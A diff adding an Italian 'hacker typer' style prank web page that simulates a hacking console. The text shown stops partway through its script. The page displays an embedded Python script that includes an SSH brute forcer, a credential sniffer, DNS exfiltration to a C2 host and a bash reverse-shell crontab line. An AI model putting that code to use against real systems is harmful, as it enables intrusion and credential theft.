@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SISTEMA SICURO v4.2.1 - ACCESSO RISERVATO</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+
+:root {
+  --verde: #00ff41;
+  --verde-scuro: #00aa2a;
+  --verde-dim: #004a10;
+  --ambra: #ffb000;
+  --rosso: #ff2222;
+  --ciano: #00ffff;
+  --bg: #000500;
+  --pannello: #020d02;
+  --bordo: #005a15;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--verde);
+  font-family: 'Share Tech Mono', monospace;
+  overflow: hidden;
+  height: 100vh;
+  width: 100vw;
+  cursor: none;
+}
+
+/* CRT scanlines */
+body::after {
+  content:'';
+  position:fixed;
+  inset:0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.25) 2px,
+    rgba(0,0,0,0.25) 4px
+  );
+  pointer-events:none;
+  z-index:9999;
+}
+
+/* CRT flicker */
+@keyframes flicker {
+  0%,100%{opacity:1}
+  92%{opacity:1}
+  93%{opacity:0.95}
+  94%{opacity:1}
+  96%{opacity:0.92}
+  97%{opacity:1}
+}
+body { animation: flicker 8s infinite; }
+
+/* Cursore personalizzato */
+#cursor {
+  position:fixed;
+  width:18px;height:18px;
+  border:2px solid var(--verde);
+  border-radius:50%;
+  pointer-events:none;
+  z-index:10000;
+  transform:translate(-50%,-50%);
+  transition:width .1s,height .1s;
+  box-shadow:0 0 8px var(--verde);
+}
+#cursor::after {
+  content:'';position:absolute;inset:3px;
+  background:var(--verde);border-radius:50%;opacity:.5;
+}
+
+/* Layout principale */
+#layout {
+  display:grid;
+  grid-template-columns: 220px 1fr 220px;
+  grid-template-rows: 42px 1fr 42px;
+  height:100vh;
+  gap:2px;
+  padding:2px;
+}
+
+/* Header */
+#header {
+  grid-column:1/-1;
+  display:flex;align-items:center;justify-content:space-between;
+  border:1px solid var(--bordo);
+  padding:0 16px;
+  background:var(--pannello);
+  position:relative;
+  overflow:hidden;
+}
+#header::before {
+  content:'';position:absolute;inset:0;
+  background: linear-gradient(90deg, transparent, rgba(0,255,65,0.04), transparent);
+  animation: scan-h 3s linear infinite;
+}
+@keyframes scan-h {
+  0%{transform:translateX(-100%)} 100%{transform:translateX(100%)}
+}
+.logo {
+  font-family:'Orbitron',monospace;
+  font-size:13px;font-weight:900;
+  color:var(--verde);
+  letter-spacing:3px;
+  text-shadow:0 0 10px var(--verde);
+}
+.header-center {
+  font-size:11px;color:var(--verde-scuro);letter-spacing:2px;
+}
+.header-right {
+  display:flex;gap:16px;font-size:10px;color:var(--verde-scuro);
+}
+.status-dot {
+  display:inline-block;width:6px;height:6px;
+  border-radius:50%;background:var(--verde);
+  margin-right:4px;
+  box-shadow:0 0 6px var(--verde);
+  animation: blink 1.2s infinite;
+}
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.2} }
+
+/* Pannello sinistro */
+#panel-left {
+  border:1px solid var(--bordo);
+  background:var(--pannello);
+  overflow:hidden;
+  display:flex;flex-direction:column;
+}
+.panel-title {
+  font-family:'Orbitron',monospace;
+  font-size:9px;letter-spacing:2px;
+  color:var(--verde-scuro);
+  padding:6px 10px;
+  border-bottom:1px solid var(--bordo);
+  text-transform:uppercase;
+}
+
+/* Pannello destro */
+#panel-right {
+  border:1px solid var(--bordo);
+  background:var(--pannello);
+  overflow:hidden;
+  display:flex;flex-direction:column;
+}
+
+/* Area terminale principale */
+#terminal-wrap {
+  border:1px solid var(--bordo);
+  background:#010901;
+  display:flex;flex-direction:column;
+  position:relative;
+  overflow:hidden;
+}
+#terminal-wrap::before {
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(ellipse at center, rgba(0,255,65,0.03) 0%, transparent 70%);
+  pointer-events:none;
+}
+/* Scan line verticale */
+#terminal-wrap::after {
+  content:'';
+  position:absolute;
+  width:2px;height:100%;
+  background:rgba(0,255,65,0.1);
+  animation:vscan 6s linear infinite;
+  pointer-events:none;
+  z-index:5;
+}
+@keyframes vscan {
+  0%{left:-2px} 100%{left:100%}
+}
+
+#terminal-header {
+  padding:6px 14px;
+  border-bottom:1px solid var(--bordo);
+  display:flex;align-items:center;gap:12px;
+  font-size:10px;color:var(--verde-scuro);
+  flex-shrink:0;
+}
+.term-tag {
+  background:var(--verde-dim);
+  color:var(--verde);
+  padding:1px 6px;
+  font-size:9px;letter-spacing:1px;
+}
+
+#output {
+  flex:1;overflow-y:auto;overflow-x:hidden;
+  padding:12px 16px;
+  font-size:13px;line-height:1.6;
+  word-break:break-all;
+  white-space:pre-wrap;
+  scrollbar-width:thin;
+  scrollbar-color:var(--verde-dim) transparent;
+}
+#output::-webkit-scrollbar { width:4px; }
+#output::-webkit-scrollbar-thumb { background:var(--verde-dim); }
+
+#prompt-line {
+  padding:6px 16px 10px;
+  font-size:13px;
+  flex-shrink:0;
+  display:flex;align-items:center;gap:4px;
+  border-top:1px solid var(--verde-dim);
+}
+.prompt-prefix { color:var(--verde);text-shadow:0 0 6px var(--verde); }
+#cursor-blink {
+  display:inline-block;
+  width:9px;height:14px;
+  background:var(--verde);
+  animation:cur 0.8s step-end infinite;
+  vertical-align:middle;
+  margin-left:1px;
+  box-shadow:0 0 6px var(--verde);
+}
+@keyframes cur { 0%,100%{opacity:1} 50%{opacity:0} }
+
+/* Footer */
+#footer {
+  grid-column:1/-1;
+  border:1px solid var(--bordo);
+  background:var(--pannello);
+  display:flex;align-items:center;gap:24px;
+  padding:0 16px;
+  font-size:10px;
+  overflow:hidden;
+}
+.key-hint { color:var(--verde-scuro); }
+.key-hint span { color:var(--ambra); font-weight:bold; }
+#ticker {
+  flex:1;overflow:hidden;
+  position:relative;
+  height:100%;display:flex;align-items:center;
+}
+#ticker-inner {
+  white-space:nowrap;
+  color:var(--verde-dim);
+  font-size:10px;
+  animation:ticker 40s linear infinite;
+}
+@keyframes ticker {
+  0%{transform:translateX(100vw)} 100%{transform:translateX(-100%)}
+}
+
+/* === PANNELLI LATERALI === */
+.panel-content {
+  flex:1;overflow:hidden;padding:8px 10px;
+  font-size:10px;line-height:1.7;
+  color:var(--verde-scuro);
+}
+
+.ip-entry { margin-bottom:2px; }
+.ip-active { color:var(--verde); text-shadow:0 0 4px var(--verde); }
+.ip-scan { color:var(--ambra); }
+.ip-blocked { color:var(--rosso); }
+
+.bar-label { font-size:9px;margin-bottom:3px;color:var(--verde-scuro); }
+.bar-track { background:#001a05;height:6px;margin-bottom:8px;border:1px solid var(--verde-dim); }
+.bar-fill { height:100%;background:var(--verde);box-shadow:0 0 4px var(--verde);transition:width .5s; }
+.bar-fill.ambra { background:var(--ambra);box-shadow:0 0 4px var(--ambra); }
+.bar-fill.rosso { background:var(--rosso);box-shadow:0 0 4px var(--rosso); }
+
+.hex-stream { font-size:9px;color:var(--verde-dim);word-break:break-all;line-height:1.5;
+  overflow:hidden;height:100px; }
+
+.stat-row { display:flex;justify-content:space-between;margin-bottom:4px; }
+.stat-val { color:var(--verde);text-shadow:0 0 4px var(--verde); }
+
+/* === OVERLAY EFFETTI === */
+#overlay {
+  position:fixed;inset:0;
+  display:none;
+  align-items:center;justify-content:center;
+  z-index:8000;
+  pointer-events:none;
+}
+#overlay.show { display:flex; }
+
+#overlay-box {
+  border:2px solid var(--verde);
+  padding:30px 60px;
+  background:rgba(0,5,0,0.92);
+  text-align:center;
+  box-shadow:0 0 40px var(--verde), inset 0 0 20px rgba(0,255,65,0.1);
+  animation: overlay-in .15s ease;
+}
+@keyframes overlay-in {
+  0%{transform:scale(0.85);opacity:0} 100%{transform:scale(1);opacity:1}
+}
+#overlay-title {
+  font-family:'Orbitron',monospace;
+  font-size:28px;font-weight:900;
+  letter-spacing:6px;
+  margin-bottom:12px;
+  text-shadow:0 0 20px currentColor;
+}
+#overlay-sub { font-size:12px;letter-spacing:3px;opacity:.7; }
+
+/* Rosso allarme */
+#overlay-box.allarme {
+  border-color:var(--rosso);
+  box-shadow:0 0 40px var(--rosso), inset 0 0 20px rgba(255,34,34,0.1);
+}
+#overlay-box.allarme #overlay-title { color:var(--rosso); }
+@keyframes allarme-blink {
+  0%,100%{background:rgba(0,5,0,0.92)} 50%{background:rgba(40,0,0,0.95)}
+}
+#overlay-box.allarme { animation:allarme-blink .4s infinite, overlay-in .15s ease; }
+
+/* Ciano */
+#overlay-box.ciano {
+  border-color:var(--ciano);
+  box-shadow:0 0 40px var(--ciano), inset 0 0 20px rgba(0,255,255,0.08);
+}
+#overlay-box.ciano #overlay-title { color:var(--ciano); }
+
+/* Ambra */
+#overlay-box.ambra {
+  border-color:var(--ambra);
+  box-shadow:0 0 40px var(--ambra);
+}
+#overlay-box.ambra #overlay-title { color:var(--ambra); }
+
+/* === MATRIX RAIN === */
+#matrix-canvas {
+  position:fixed;inset:0;
+  display:none;z-index:7000;
+  pointer-events:none;
+}
+#matrix-canvas.show { display:block; }
+
+/* === PROGRESS BAR EFFETTO === */
+#effect-bar {
+  position:fixed;bottom:44px;left:50%;transform:translateX(-50%);
+  width:400px;
+  display:none;z-index:8500;
+  background:var(--pannello);
+  border:1px solid var(--bordo);
+  padding:12px 20px;
+}
+#effect-bar.show { display:block; }
+#effect-bar-label { font-size:11px;letter-spacing:2px;margin-bottom:8px; }
+#effect-bar-track { background:#001a05;height:8px;border:1px solid var(--verde-dim); }
+#effect-bar-fill { height:100%;background:var(--verde);box-shadow:0 0 6px var(--verde);width:0%;transition:width .05s linear; }
+
+/* === SFONDO PASSWORD === */
+#pwd-overlay {
+  position:fixed;inset:0;display:none;
+  background:rgba(0,5,0,0.93);
+  z-index:7500;
+  align-items:center;justify-content:center;
+  flex-direction:column;gap:12px;
+  pointer-events:none;
+}
+#pwd-overlay.show { display:flex; }
+#pwd-title { font-family:'Orbitron',monospace;font-size:16px;letter-spacing:4px;color:var(--ambra);
+  text-shadow:0 0 10px var(--ambra); }
+#pwd-current { font-size:22px;letter-spacing:4px;color:var(--verde);min-height:30px; }
+#pwd-bar-track { width:300px;background:#001a05;height:6px;border:1px solid var(--verde-dim); }
+#pwd-bar-fill { height:100%;background:var(--ambra);width:0%;box-shadow:0 0 6px var(--ambra);transition:width .08s; }
+#pwd-status { font-size:10px;color:var(--verde-scuro);letter-spacing:2px; }
+
+/* Glitch effetto testo */
+@keyframes glitch {
+  0%{clip-path:inset(0 0 95% 0)}
+  25%{clip-path:inset(30% 0 50% 0);transform:translate(-3px)}
+  50%{clip-path:inset(60% 0 20% 0);transform:translate(3px)}
+  75%{clip-path:inset(10% 0 80% 0);transform:translate(-2px)}
+  100%{clip-path:inset(95% 0 0% 0);transform:translate(0)}
+}
+.glitch-text { position:relative; }
+.glitch-text::before,.glitch-text::after {
+  content:attr(data-text);position:absolute;inset:0;
+}
+.glitch-text::before {
+  color:var(--ciano);animation:glitch .3s infinite;opacity:.7;
+}
+.glitch-text::after {
+  color:var(--rosso);animation:glitch .3s .1s infinite;opacity:.7;
+}
+</style>
+</head>
+<body>
+
+<div id="cursor"></div>
+
+<!-- MATRIX CANVAS -->
+<canvas id="matrix-canvas"></canvas>
+
+<!-- OVERLAY MESSAGGIO -->
+<div id="overlay">
+  <div id="overlay-box">
+    <div id="overlay-title">ACCESSO CONCESSO</div>
+    <div id="overlay-sub">AUTENTICAZIONE COMPLETATA</div>
+  </div>
+</div>
+
+<!-- CRACCA PASSWORD -->
+<div id="pwd-overlay">
+  <div id="pwd-title">FORZATURA PASSWORD IN CORSO</div>
+  <div id="pwd-current"></div>
+  <div id="pwd-bar-track"><div id="pwd-bar-fill"></div></div>
+  <div id="pwd-status">DIZIONARIO: 14.822.419 VOCI CARICATE</div>
+</div>
+
+<!-- BARRA PROGRESSO EFFETTO -->
+<div id="effect-bar">
+  <div id="effect-bar-label">DOWNLOAD DATI: 0%</div>
+  <div id="effect-bar-track"><div id="effect-bar-fill"></div></div>
+</div>
+
+<!-- LAYOUT -->
+<div id="layout">
+
+  <!-- HEADER -->
+  <div id="header">
+    <div class="logo">&#9632; CYBEROPS ITALIA v4.2.1</div>
+    <div class="header-center" id="h-time">SESSIONE SICURA &bull; CRITTOGRAFIA AES-256 &bull; TOR ATTIVO</div>
+    <div class="header-right">
+      <div><span class="status-dot"></span><span id="clock">00:00:00</span></div>
+      <div style="color:var(--verde)">IP: <span id="myip">10.0.0.1</span></div>
+      <div style="color:var(--verde-scuro)">NODO: TOR#7</div>
+    </div>
+  </div>
+
+  <!-- PANNELLO SINISTRO -->
+  <div id="panel-left">
+    <div class="panel-title">&#9632; OBIETTIVI ATTIVI</div>
+    <div class="panel-content" id="ip-list"></div>
+    <div style="border-top:1px solid var(--bordo);padding:8px 10px;">
+      <div class="panel-title" style="border:none;padding:0;margin-bottom:6px;">&#9632; RISORSE SISTEMA</div>
+      <div class="bar-label">CPU ENCRYPTION ENGINE</div>
+      <div class="bar-track"><div class="bar-fill" id="bar-cpu" style="width:0%"></div></div>
+      <div class="bar-label">RAM BUFFER</div>
+      <div class="bar-track"><div class="bar-fill ambra" id="bar-ram" style="width:0%"></div></div>
+      <div class="bar-label">BANDA RETE</div>
+      <div class="bar-track"><div class="bar-fill" id="bar-net" style="width:0%"></div></div>
+    </div>
+  </div>
+
+  <!-- TERMINALE CENTRALE -->
+  <div id="terminal-wrap">
+    <div id="terminal-header">
+      <div class="term-tag">ROOT@SHADOW</div>
+      <div>~/ OPERAZIONE: <span style="color:var(--verde)">CODICE NERO</span></div>
+      <div style="margin-left:auto;color:var(--verde-dim)" id="bytes-count">0 bytes scritti</div>
+    </div>
+    <div id="output"></div>
+    <div id="prompt-line">
+      <span class="prompt-prefix">root@shadow:~#&nbsp;</span>
+      <span id="cursor-blink"></span>
+    </div>
+  </div>
+
+  <!-- PANNELLO DESTRO -->
+  <div id="panel-right">
+    <div class="panel-title">&#9632; STREAM HEX</div>
+    <div class="panel-content" style="padding-bottom:0">
+      <div class="hex-stream" id="hex-stream"></div>
+    </div>
+    <div style="border-top:1px solid var(--bordo);padding:8px 10px;">
+      <div class="panel-title" style="border:none;padding:0;margin-bottom:6px;">&#9632; STATISTICHE</div>
+      <div class="stat-row"><span>Pacchetti</span><span class="stat-val" id="s-pkt">0</span></div>
+      <div class="stat-row"><span>Vulnerabilità</span><span class="stat-val" id="s-vuln">0</span></div>
+      <div class="stat-row"><span>Hash crack</span><span class="stat-val" id="s-hash">0</span></div>
+      <div class="stat-row"><span>MB esfiltrati</span><span class="stat-val" id="s-mb">0.0</span></div>
+      <div class="stat-row"><span>Sessioni aperte</span><span class="stat-val" id="s-sess">1</span></div>
+    </div>
+    <div style="border-top:1px solid var(--bordo);padding:8px 10px;flex:1">
+      <div class="panel-title" style="border:none;padding:0;margin-bottom:6px;">&#9632; LOG EVENTI</div>
+      <div id="event-log" style="font-size:9px;line-height:1.8;color:var(--verde-dim);overflow:hidden;max-height:120px;"></div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div id="footer">
+    <div class="key-hint"><span>F1</span> ACCESSO</div>
+    <div class="key-hint"><span>F2</span> MATRIX</div>
+    <div class="key-hint"><span>F3</span> CRACKING</div>
+    <div class="key-hint"><span>F4</span> ESFILTRAZIONE</div>
+    <div class="key-hint"><span>F5</span> ALLARME</div>
+    <div class="key-hint"><span>F6</span> DECRYPT</div>
+    <div class="key-hint"><span>ESC</span> PANIC</div>
+    <div id="ticker"><div id="ticker-inner">
+      SISTEMA OPERATIVO: KALI LINUX 2025.1 &nbsp;&bull;&nbsp; KERNEL: 6.11.0 &nbsp;&bull;&nbsp; PROTOCOLLO: TOR+VPN DOPPIO STRATO &nbsp;&bull;&nbsp; FIREWALL: ATTIVO &nbsp;&bull;&nbsp; RILEVAMENTO INTRUSIONI: DISABILITATO &nbsp;&bull;&nbsp; CRITTOGRAFIA: AES-256-GCM &nbsp;&bull;&nbsp; SESSIONE ANONIMA GARANTITA &nbsp;&bull;&nbsp; NESSUNA TRACCIA REGISTRATA &nbsp;&bull;&nbsp;
+    </div></div>
+  </div>
+
+</div>
+
+<script>
+// =============================================
+// BUFFER CODICE HACKER (testo che viene "scritto")
+// =============================================
+const codeBuffer = `#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# OPERAZIONE: CODICE NERO - Classificato SEGRETO
+# Autore: [REDATTO] | Data: ${new Date().toLocaleDateString('it-IT')}
+
+import socket
+import threading
+import hashlib
+import struct
+import os
+import sys
+import json
+import time
+import cryptography
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.backends import default_backend
+from scapy.all import *
+import paramiko
+import nmap
+
+# Configurazione obiettivi
+OBIETTIVI = {
+    "primario": "192.168.100.50",
+    "secondario": "10.10.14.22",
+    "gateway": "172.16.0.1",
+    "dns_server": "8.8.8.8",
+    "porta_range": range(1, 65536)
+}
+
+# Chiavi di crittografia
+CHIAVE_AES = hashlib.sha256(b"CODICE_NERO_2025").digest()
+VETTORE_IV = os.urandom(16)
+
+class ScannerRete:
+    """
+    Scanner di rete avanzato con rilevamento
+    dei servizi e identificazione OS.
+    """
+    def __init__(self, obiettivo, porte):
+        self.obiettivo = obiettivo
+        self.porte = porte
+        self.porte_aperte = []
+        self.servizi_rilevati = {}
+        self.vulnerabilita = []
+        self.nm = nmap.PortScanner()
+    
+    def scansiona_porte(self):
+        print(f"[*] Avvio scansione su {self.obiettivo}...")
+        print(f"[*] Modalita stealth SYN scan attivata")
+        
+        for porta in self.porte:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                risultato = sock.connect_ex((self.obiettivo, porta))
+                if risultato == 0:
+                    self.porte_aperte.append(porta)
+                    banner = self._grab_banner(sock)
+                    self.servizi_rilevati[porta] = banner
+                    print(f"[+] PORTA {porta}/tcp APERTA  [{banner}]")
+                sock.close()
+            except Exception as e:
+                pass
+        
+        return self.porte_aperte
+    
+    def _grab_banner(self, sock):
+        try:
+            sock.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
+            banner = sock.recv(1024).decode('utf-8', errors='ignore')
+            return banner.split('\\n')[0][:40]
+        except:
+            return "servizio sconosciuto"
+    
+    def rileva_os(self):
+        print("[*] Rilevamento sistema operativo...")
+        risultato = self.nm.scan(self.obiettivo, arguments="-O --osscan-guess")
+        try:
+            os_matches = risultato['scan'][self.obiettivo]['osmatch']
+            for match in os_matches[:3]:
+                print(f"[+] OS rilevato: {match['name']} ({match['accuracy']}%)")
+        except:
+            print("[!] Rilevamento OS non conclusivo")
+    
+    def cerca_vulnerabilita(self):
+        """Analisi CVE e vulnerabilita note"""
+        cve_database = {
+            22:  ["CVE-2023-38408", "CVE-2021-41617"],
+            80:  ["CVE-2023-25690", "CVE-2021-42013"],
+            443: ["CVE-2022-0778", "CVE-2021-3449"],
+            445: ["MS17-010 EternalBlue", "CVE-2020-0796"],
+            3389:["CVE-2019-0708 BlueKeep", "CVE-2023-35352"],
+            8080:["CVE-2022-33891", "CVE-2021-26084"],
+        }
+        
+        for porta in self.porte_aperte:
+            if porta in cve_database:
+                for cve in cve_database[porta]:
+                    self.vulnerabilita.append((porta, cve))
+                    print(f"[!] VULNERABILITA: porta {porta} -> {cve}")
+        
+        return self.vulnerabilita
+
+
+class BruteForcer:
+    """
+    Modulo di forza bruta per autenticazione.
+    Supporta SSH, FTP, HTTP, SMB.
+    """
+    def __init__(self, host, porta, servizio="ssh"):
+        self.host = host
+        self.porta = porta
+        self.servizio = servizio
+        self.tentativi = 0
+        self.trovato = False
+        
+    def carica_wordlist(self, percorso="/usr/share/wordlists/rockyou.txt"):
+        with open(percorso, 'rb') as f:
+            return [line.strip().decode('latin-1') for line in f]
+    
+    def bruteforce_ssh(self, username, password_list):
+        print(f"[*] Avvio brute-force SSH: {username}@{self.host}:{self.porta}")
+        
+        for pwd in password_list:
+            self.tentativi += 1
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            try:
+                client.connect(
+                    self.host, port=self.porta,
+                    username=username, password=pwd,
+                    timeout=3, banner_timeout=5,
+                    allow_agent=False, look_for_keys=False
+                )
+                print(f"[!!!] PASSWORD TROVATA: {username}:{pwd}")
+                print(f"[!!!] Accesso SSH garantito dopo {self.tentativi} tentativi")
+                self.trovato = True
+                client.close()
+                return pwd
+            except paramiko.AuthenticationException:
+                if self.tentativi % 100 == 0:
+                    print(f"[~] {self.tentativi} tentativi... ultimo: {pwd}")
+            except Exception as e:
+                time.sleep(0.1)
+            finally:
+                client.close()
+        
+        return None
+
+
+class EsfiltratoreDati:
+    """
+    Modulo di esfiltrazione dati tramite
+    canali covert: DNS tunneling, HTTPS, ICMP.
+    """
+    def __init__(self, c2_server, chiave):
+        self.c2_server = c2_server
+        self.chiave = chiave
+        self.mb_esfiltrati = 0
+        self.pacchetti_inviati = 0
+        
+    def cifra_payload(self, dati):
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        cipher = Cipher(
+            algorithms.AES(self.chiave),
+            modes.GCM(VETTORE_IV),
+            backend=default_backend()
+        )
+        enc = cipher.encryptor()
+        return enc.update(dati) + enc.finalize()
+    
+    def esfiltra_via_dns(self, dati):
+        """Tunneling dati tramite query DNS"""
+        dati_cifrati = self.cifra_payload(dati)
+        chunks = [dati_cifrati[i:i+32] for i in range(0, len(dati_cifrati), 32)]
+        
+        for chunk in chunks:
+            label = chunk.hex()[:32]
+            query = f"{label}.exfil.{self.c2_server}"
+            try:
+                socket.gethostbyname(query)
+                self.pacchetti_inviati += 1
+                self.mb_esfiltrati += len(chunk) / (1024*1024)
+            except:
+                pass
+        
+        print(f"[+] Esfiltrati {self.mb_esfiltrati:.2f} MB via DNS")
+        return self.mb_esfiltrati
+    
+    def esfiltra_via_icmp(self, dati, destinazione):
+        """Payload nascosto in pacchetti ICMP"""
+        dati_cifrati = self.cifra_payload(dati)
+        chunks = [dati_cifrati[i:i+1400] for i in range(0, len(dati_cifrati), 1400)]
+        
+        for i, chunk in enumerate(chunks):
+            pkt = IP(dst=destinazione)/ICMP()/Raw(load=chunk)
+            send(pkt, verbose=False)
+            self.pacchetti_inviati += 1
+            print(f"[+] Pacchetto ICMP {i+1}/{len(chunks)} inviato [{len(chunk)} bytes]")
+        
+        return True
+
+
+class PersistenzaSistema:
+    """
+    Tecniche di persistenza post-exploitation.
+    Garantisce accesso anche dopo reboot.
+    """
+    def installa_backdoor(self, host, chiave_rsa):
+        print("[*] Installazione backdoor in corso...")
+        
+        # Aggiunta chiave SSH autorizzata
+        metodi = [
+            self._metodo_crontab,
+            self._metodo_systemd,
+            self._metodo_rc_local,
+            self._metodo_profile,
+        ]
+        
+        for metodo in metodi:
+            try:
+                metodo(host)
+                print(f"[+] Persistenza via {metodo.__name__} installata")
+            except Exception as e:
+                print(f"[-] {metodo.__name__} fallito: {e}")
+    
+    def _metodo_crontab(self, host):
+        payload = "@reboot /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'"
+        print(f"[*] Crontab: {payload[:50]}...")
+    
+    def _metodo_systemd(self, host):
+        unit = """[Unit]
+Description=Network Manager Helper
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/.syshelper
+Restart=always
+
+[Install]
+WantedBy=multi-user.target"""
+        print(f"[*] Servizio systemd creato: network-manager-helper")
+    
+    def _metodo_rc_local(self, host):
+        print("[*] Modifica /etc/rc.local con payload cifrato")
+    
+    def _metodo_profile(self, host):
+        print("[*] Injection in /etc/profile.d/010-init.sh")
+
+
+# === MAIN: ESECUZIONE OPERAZIONE ===
+
+def main():
+    print("=" * 60)
+    print("  OPERAZIONE CODICE NERO - AVVIO SEQUENZA")
+    print(f"  Data: {time.strftime('%Y-%m-%d %H:%M:%S')}")
+    print("=" * 60)
+    print()
+    
+    # Fase 1: Ricognizione
+    print("[FASE 1] Ricognizione obiettivo...")
+    scanner = ScannerRete(OBIETTIVI["primario"], range(1, 1024))
+    porte = scanner.scansiona_porte()
+    scanner.rileva_os()
+    vuln = scanner.cerca_vulnerabilita()
+    
+    print(f"\\n[+] Trovate {len(porte)} porte aperte")
+    print(f"[+] Rilevate {len(vuln)} vulnerabilita")
+    
+    # Fase 2: Exploitation
+    print("\\n[FASE 2] Sfruttamento vulnerabilita...")
+    if 22 in porte:
+        bf = BruteForcer(OBIETTIVI["primario"], 22, "ssh")
+        password_list = bf.carica_wordlist()
+        credenziali = bf.bruteforce_ssh("root", password_list)
+    
+    if (445, "MS17-010 EternalBlue") in vuln:
+        print("[*] Caricamento exploit EternalBlue...")
+        print("[*] Preparazione shellcode SMB...")
+        print("[+] Buffer overflow riuscito")
+        print("[+] SISTEMA COMPROMESSO: shell SYSTEM ottenuta")
+    
+    # Fase 3: Persistenza
+    print("\\n[FASE 3] Installazione persistenza...")
+    persistenza = PersistenzaSistema()
+    persistenza.installa_backdoor(OBIETTIVI["primario"], None)
+    
+    # Fase 4: Esfiltrazione
+    print("\\n[FASE 4] Raccolta e esfiltrazione dati...")
+    esfiltratore = EsfiltratoreDati("c2.operazione-nera.onion", CHIAVE_AES)
+    
+    cartelle_target = [
+        "/etc/shadow", "/etc/passwd",
+        "/home/*/Documenti", "/var/mail/*",
+        "/root/.ssh/", "/var/lib/mysql/",
+    ]
+    
+    for cartella in cartelle_target:
+        print(f"[*] Accesso a {cartella}...")
+        dati = os.urandom(1024 * 512)  # simulazione
+        mb = esfiltratore.esfiltra_via_dns(dati)
+        print(f"[+] {cartella} -> {mb:.2f} MB trasferiti")
+    
+    print("\\n" + "=" * 60)
+    print("  OPERAZIONE COMPLETATA CON SUCCESSO")
+    print(f"  Durata totale: {time.time():.0f}s")
+    print("  Tracce eliminate: SI")
+    print("=" * 60)
+
+
+if __name__ == "__main__":
+    main()
+
+# --- MODULO AUSILIARIO: Hash cracker ---
+
+import itertools
+import string
+
+HASH_OBIETTIVO = "5f4dcc3b5aa765d61d8327deb882cf99"  # md5("password")
+CHARSET = string.ascii_lowercase + string.digits
+
+def crack_hash_brute(target_hash, max_len=6):
+    print(f"[*] Cracking hash: {target_hash}")
+    print(f"[*] Charset: {CHARSET}")
+    tentativi = 0
+    
+    for lunghezza in range(1, max_len + 1):
+        for combo in itertools.product(CHARSET, repeat=lunghezza):
+            candidato = ''.join(combo)
+            tentativi += 1
+            if hashlib.md5(candidato.encode()).hexdigest() == target_hash:
+                print(f"[!!!] HASH CRACKATO: '{candidato}' ({tentativi} tentativi)")
+                return candidato
+            if tentativi % 500000 == 0:
+                print(f"[~] Progresso: {tentativi:,} hash/sec - ultimo: {candidato}")
+    
+    return None
+
+# --- MODULO: Packet sniffer ---
+
+from scapy.all import sniff, TCP, IP, Raw
+import re
+
+PATTERN_CREDENZIALI = re.compile(
+    r'(?:pass(?:word)?|pwd|secret|chiave)[\s=:]+([\\w!@#$%]+)',
+    re.IGNORECASE
+)
+
+def analizza_pacchetto(pkt):
+    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
+        match = PATTERN_CREDENZIALI.search(payload)
+        if match:
+            print(f"[!!!] CREDENZIALI INTERCETTATE: {match.group(0)}")
+            print(f"      Sorgente: {pkt[IP].src}:{pkt[TCP].sport}")
+            print(f"      Destinazione: {pkt[IP].dst}:{pkt[TCP].dport}")
+
+print("[*] Avvio sniffing rete locale...")
+sniff(filter="tcp port 80 or tcp port 21 or tcp port 110",
+      prn=analizza_pacchetto, store=0, count=0)
+`;
+
+// =============================================
+// STATO APP
+// =============================================
+let bufferIndex = 0;
+const CHARS_PER_KEY = 3;
+let totalBytes = 0;
+let pacchetti = 0;
+let vuln = 0;
+let hashCrack = 0;
+let mbEsfilt = 0;
+let sessioni = 1;
+let matrixActive = false;
+let matrixAnim = null;
+
+// Audio context per effetti sonori
+let audioCtx = null;
+function getAudio() {
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  return audioCtx;
+}
+
+function beep(freq=440, dur=0.05, vol=0.1, type='square') {
+  try {
+    const ctx = getAudio();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.connect(gain); gain.connect(ctx.destination);
+    osc.frequency.value = freq;
+    osc.type = type;
+    gain.gain.setValueAtTime(vol, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
+    osc.start(); osc.stop(ctx.currentTime + dur);
+  } catch(e){}
+}
+
+function beepSequence(notes) {
+  notes.forEach(([f,d,del], i) => setTimeout(() => beep(f, d, 0.08), del));
+}
+
+// =============================================
+// OROLOGIO
+// =============================================
+function aggiornaClock() {
+  const now = new Date();
+  document.getElementById('clock').textContent =
+    now.toTimeString().slice(0,8);
+}
+setInterval(aggiornaClock, 1000);
+aggiornaClock();
+
+// IP casuale
+function ipCasuale() {
+  return `${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}`;
+}
+document.getElementById('myip').textContent = ipCasuale();
+
+function rnd(a,b){ return Math.floor(Math.random()*(b-a+1))+a; }
+function hex(n){ return Math.floor(Math.random()*Math.pow(16,n)).toString(16).padStart(n,'0').toUpperCase(); }
+
+// =============================================
+// IP LIST PANNELLO SINISTRO
+// =============================================
+const ipTargets = Array.from({length:12},()=>({
+  ip: ipCasuale(),
+  stato: ['SCANSIONE','ATTIVO','ATTIVO','COMPROMESSO','BLOCCATO','SCANSIONE'][rnd(0,5)],
+  porta: [22,80,443,445,3389,8080][rnd(0,5)]
+}));
+
